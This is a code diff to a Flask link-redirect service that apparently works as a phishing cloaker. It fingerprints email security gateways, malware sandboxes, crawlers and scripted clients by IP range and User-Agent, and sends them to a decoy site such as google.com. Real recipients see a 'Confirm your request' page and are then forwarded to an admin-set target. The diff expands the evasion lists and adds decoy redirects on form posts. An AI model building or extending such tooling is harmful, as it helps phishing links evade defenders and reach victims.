@@ -27,8 +27,11 @@ LOG_WEBHOOK_URL = os.environ.get("LOG_WEBHOOK_URL", "")
 KV_URL = os.environ.get("KV_REST_API_URL", "")
 KV_TOKEN = os.environ.get("KV_REST_API_TOKEN", "")
 
-# Default URL to send unwanted traffic (bots, scanners, email filters) to
 UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.google.com")
+ALLOWED_DECOY_HOSTS = {
+    h.strip().lower() for h in
+    os.environ.get("ALLOWED_DECOY_HOSTS", "").split(",") if h.strip()
+}
 
 app = Flask(__name__)
 app.secret_key = SK.encode()
@@ -54,18 +57,46 @@ TALOS = [ip_network("208.75.176.0/22"), ip_network("216.160.0.0/19")]
 GOOGLE_SAFEBROWSING = [ip_network("66.249.64.0/19"), ip_network("2001:4860::/32")]
 
 SCANNER_NETS = {
-    "microsoft_eop": EOP, "proofpoint": PROOFPOINT, "mimecast": MIMECAST,
-    "barracuda": BARRACUDA, "cisco_talos": TALOS, "google_safebrowsing": GOOGLE_SAFEBROWSING,
+    "microsoft_eop": EOP,
+    "proofpoint": PROOFPOINT,
+    "mimecast": MIMECAST,
+    "barracuda": BARRACUDA,
+    "cisco_talos": TALOS,
+    "google_safebrowsing": GOOGLE_SAFEBROWSING,
+    "abnormal": [ip_network("199.255.200.0/22"), ip_network("192.30.44.0/22")],
+    "avanan": [ip_network("52.5.0.0/16"), ip_network("52.20.0.0/14"), ip_network("34.192.0.0/12")],
+    "ironscales": [ip_network("104.196.0.0/14"), ip_network("35.184.0.0/13")],
+    "cloudflare_email": [ip_network("104.30.0.0/18")],
+    "zscaler": [ip_network("104.129.192.0/20"), ip_network("165.225.0.0/17")],
+    "forcepoint": [ip_network("157.238.0.0/16"), ip_network("209.104.0.0/20")],
 }
 
 SCANNER_UA_TOKENS = (
     "microsoft office", "safelinks", "microsoft preview", "proofpoint",
-    "pp-url", "mimecast", "barracuda", "talos", "urlscan", "urlscan.io",
-    "virustotal", "any.run", "hybrid-analysis", "joesandbox", "googlebot",
-    "google-safety", "bingpreview", "facebookexternalhit", "slackbot",
-    "twitterbot", "linkedinbot", "discordbot", "telegrambot", "whatsapp",
-    "skypeuripreview",
+    "pp-url", "mimecast", "barracuda", "talos", "ironport",
+    "forcepoint", "symantec", "messagelabs", "trendmicro", "trend micro",
+    "kaspersky", "sophos", "fireeye", "mandiant", "abnormal security",
+    "avanan", "ironscales", "cloudmark", "agari", "valimail",
+    "hornetsecurity", "spamhaus", "zerospam", "retarus", "vade",
+    "urlscan", "urlscan.io", "virustotal", "any.run", "hybrid-analysis",
+    "joesandbox", "joe sandbox", "cuckoo", "triage", "hatching",
+    "intezer", "cape sandbox", "reverse.it", "filescan.io",
+    "googlebot", "google-safety", "bingpreview", "bingbot", "duckduckbot",
+    "yandexbot", "baiduspider", "slackbot", "twitterbot", "facebookexternalhit",
+    "linkedinbot", "discordbot", "telegrambot", "whatsapp", "skypeuripreview",
+    "applebot", "pinterestbot", "embedly", "quora link preview", "outbrain",
+    "nuzzel", "vk share", "w3c_validator",
+    "curl/", "wget/", "python-requests", "python-urllib", "go-http-client",
+    "java/", "okhttp", "axios/", "node-fetch", "undici", "libwww-perl",
+    "masscan", "nmap", "zgrab", "nuclei", "nikto", "sqlmap",
+    "headlesschrome", "phantomjs", "puppeteer", "playwright",
+    "lighthouse", "pagespeed", "gtmetrix", "pingdom", "uptimerobot",
+    "statuscake", "site24x7", "newrelic", "datadog synthetics",
 )
+
+ALLOWLIST_IPS = []
+ALLOWLIST_UA = ()
+
 
 def client_ip() -> str:
     xff = request.headers.get("X-Forwarded-For", "")
@@ -73,13 +104,21 @@ def client_ip() -> str:
         return xff.split(",")[0].strip()
     return request.remote_addr or ""
 
+
 def classify(ip: str, ua: str) -> dict:
     out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
+    low = ua.lower()
+    if any(tok in low for tok in ALLOWLIST_UA):
+        out["source"] = "allowlist_ua"
+        return out
     try:
         a = ip_address(ip)
     except ValueError:
         a = None
     if a is not None:
+        if any(a in n for n in ALLOWLIST_IPS):
+            out["source"] = "allowlist_ip"
+            return out
         for name, nets in SCANNER_NETS.items():
             if any(a in n for n in nets):
                 out["scanner"] = True
@@ -87,7 +126,6 @@ def classify(ip: str, ua: str) -> dict:
                 out["method"] = "ip"
                 break
     if not out["scanner"]:
-        low = ua.lower()
         for tok in SCANNER_UA_TOKENS:
             if tok in low:
                 out["scanner"] = True
@@ -96,6 +134,14 @@ def classify(ip: str, ua: str) -> dict:
                 break
     return out
 
+
+def _valid_http_url(u: str) -> bool:
+    return isinstance(u, str) and u.startswith(("http://", "https://"))
+
+
+# ---------------------------------------------------------------------------
+# KV one-time store
+# ---------------------------------------------------------------------------
 async def kv_setnx(key: str, ttl: int) -> bool:
     if not KV_URL or not KV_TOKEN:
         return _local_setnx(key, ttl)
@@ -113,7 +159,9 @@ async def kv_setnx(key: str, ttl: int) -> bool:
             log.error(json.dumps({"event": "kv_unavailable_fail_open", "err": str(e), "key": key[:32]}))
             return True
 
-_LOCAL_SEEN: dict[str, float] = {}
+
+_LOCAL_SEEN: dict = {}
+
 
 def _local_setnx(key: str, ttl: int) -> bool:
     now = time.time()
@@ -124,6 +172,7 @@ def _local_setnx(key: str, ttl: int) -> bool:
     _LOCAL_SEEN[key] = now + ttl
     return True
 
+
 async def emit_log(event: dict) -> None:
     log.info(json.dumps(event, separators=(",", ":")))
     if LOG_WEBHOOK_URL:
@@ -133,17 +182,38 @@ async def emit_log(event: dict) -> None:
         except httpx.HTTPError:
             pass
 
+
+def _apply_unified_headers(resp):
+    resp.headers.update({
+        "Cache-Control": "no-store, no-cache, must-revalidate, private",
+        "Pragma": "no-cache",
+        "Expires": "0",
+        "X-Frame-Options": "DENY",
+        "X-Content-Type-Options": "nosniff",
+        "Referrer-Policy": "no-referrer",
+        "Content-Security-Policy": (
+            "default-src 'self'; "
+            "img-src 'self' data: https:; "
+            "style-src 'self' 'unsafe-inline' https:; "
+            "font-src 'self' data: https:; "
+            "script-src 'none'; "
+            "connect-src 'none'; "
+            "form-action 'self'; "
+            "base-uri 'none'; "
+            "frame-ancestors 'none'"
+        ),
+    })
+
+
 def _static_page(title: str, text: str, status_code: int):
     html = f"""<!doctype html><html><head><meta charset="utf-8"><title>{title}</title>
     <style>body{{font-family:system-ui,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#f6f7f9}}
     .c{{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.05);text-align:center;max-width:400px}}</style>
     </head><body><div class="c"><h1>{title}</h1><p>{text}</p></div></body></html>"""
     resp = make_response(html, status_code)
-    resp.headers["Cache-Control"] = "no-store"
-    resp.headers["X-Frame-Options"] = "DENY"
-    resp.headers["X-Content-Type-Options"] = "nosniff"
-    resp.headers["Referrer-Policy"] = "no-referrer"
+    _apply_unified_headers(resp)
     return resp
+
 
 LANDING = """<!doctype html>
 <html lang="en">
@@ -176,9 +246,14 @@ LANDING = """<!doctype html>
 </body>
 </html>"""
 
+
+# ---------------------------------------------------------------------------
+# routes
+# ---------------------------------------------------------------------------
 @app.route("/health", methods=["GET"])
 def health():
     return jsonify({"ok": True, "ts": int(time.time())})
+
 
 @app.route("/", methods=["GET"])
 def root():
@@ -194,15 +269,15 @@ async def landing(token: str):
     except BadSignature:
         return _static_page("Invalid link", "This link is not valid.", 404)
 
-    # Classify traffic source
     tag = classify(client_ip(), request.headers.get("User-Agent", ""))
     await emit_log({"event": "landing_get", **tag, "token": token[:12]})
 
-    # If traffic is identified as a bot, scanner, or email link previewer, 
-    # redirect them to the configured unwanted URL.
     if tag["scanner"]:
-        unwanted_url = data.get("unwanted_target", UNWANTED_REDIRECT_URL)
-        return redirect(unwanted_url, code=302)
+        unwanted = data.get("unwanted_target") or UNWANTED_REDIRECT_URL
+        if not _valid_http_url(unwanted):
+            unwanted = UNWANTED_REDIRECT_URL
+        await emit_log({"event": "landing_scanner_redirect", **tag, "token": token[:12], "to": unwanted})
+        return redirect(unwanted, code=302)
 
     nonce = secrets.token_urlsafe(16)
     payload = {"t": token, "n": nonce, "ts": time.time()}
@@ -232,23 +307,25 @@ async def landing(token: str):
         samesite="Lax",
         path="/",
     )
-    resp.headers.update({
-        "Cache-Control": "no-store, no-cache, must-revalidate, private",
-        "Pragma": "no-cache",
-        "Expires": "0",
-        "X-Frame-Options": "DENY",
-        "X-Content-Type-Options": "nosniff",
-        "Referrer-Policy": "no-referrer",
-        "Content-Security-Policy": (
-            "default-src 'none'; style-src 'unsafe-inline'; "
-            "form-action 'self'; base-uri 'none'; frame-ancestors 'none'"
-        ),
-    })
+    _apply_unified_headers(resp)
     return resp
 
 
 @app.route("/submit/<token>", methods=["POST"])
 async def execute(token: str):
+    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
+
+    if tag["scanner"]:
+        try:
+            data = serializer.loads(token, max_age=TOKEN_TTL)
+            unwanted = data.get("unwanted_target") or UNWANTED_REDIRECT_URL
+        except (SignatureExpired, BadSignature):
+            unwanted = UNWANTED_REDIRECT_URL
+        if not _valid_http_url(unwanted):
+            unwanted = UNWANTED_REDIRECT_URL
+        await emit_log({"event": "post_scanner_redirect", **tag, "token": token[:12], "to": unwanted})
+        return redirect(unwanted, code=302)
+
     if request.form.get("email_confirm_hp"):
         await emit_log({"event": "post_honeypot", "ip": client_ip(), "token": token[:12]})
         return _static_page("Submission Blocked", "Automated behavior detected.", 400)
@@ -284,15 +361,11 @@ async def execute(token: str):
     except BadSignature:
         return _static_page("Invalid link", "This link is not valid.", 404)
 
-    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
     await emit_log({"event": "post_ok", **tag, "token": token[:12]})
 
     resp = make_response(redirect(data["target"], code=303))
     resp.delete_cookie("gate_session", path="/")
-    resp.headers["Cache-Control"] = "no-store"
-    resp.headers["X-Frame-Options"] = "DENY"
-    resp.headers["X-Content-Type-Options"] = "nosniff"
-    resp.headers["Referrer-Policy"] = "no-referrer"
+    _apply_unified_headers(resp)
     return resp
 
 
@@ -304,22 +377,32 @@ def mint():
     admin_key = os.environ.get("ADMIN_KEY", "")
     if not admin_key or request.headers.get("X-Admin-Key") != admin_key:
         abort(404)
+
     body = request.get_json(silent=True) or {}
+
     target = body.get("target")
-    if not isinstance(target, str) or not target.startswith(("http://", "https://")):
-        return jsonify({"error": "target required"}), 400
-    
-    # Optional per-link unwanted redirect URL override
+    if not _valid_http_url(target):
+        return jsonify({"error": "target must be an http(s) URL"}), 400
+
     unwanted_target = body.get("unwanted_target")
-    if unwanted_target and not isinstance(unwanted_target, str):
-        return jsonify({"error": "unwanted_target must be a string"}), 400
+    if unwanted_target:
+        if not _valid_http_url(unwanted_target):
+            return jsonify({"error": "unwanted_target must be an http(s) URL"}), 400
 
     tok = serializer.dumps({
         "target": target,
-        "unwanted_target": unwanted_target,
+        "unwanted_target": unwanted_target or "",
         "title": body.get("title", "Confirm your request"),
         "body": body.get("body", "Click the button below to continue."),
         "cta": body.get("cta", "Click here to confirm"),
     })
     base = request.host_url.rstrip("/")
-    return jsonify({"url": f"{base}/r/{tok}", "token": tok})
+    return jsonify({
+        "url": f"{base}/r/{tok}",
+        "token": tok,
+        "unwanted_target": unwanted_target or UNWANTED_REDIRECT_URL,
+    })
+
+
+if __name__ == "__main__":
+    app.run(host="127.0.0.1", port=5000, debug=True)
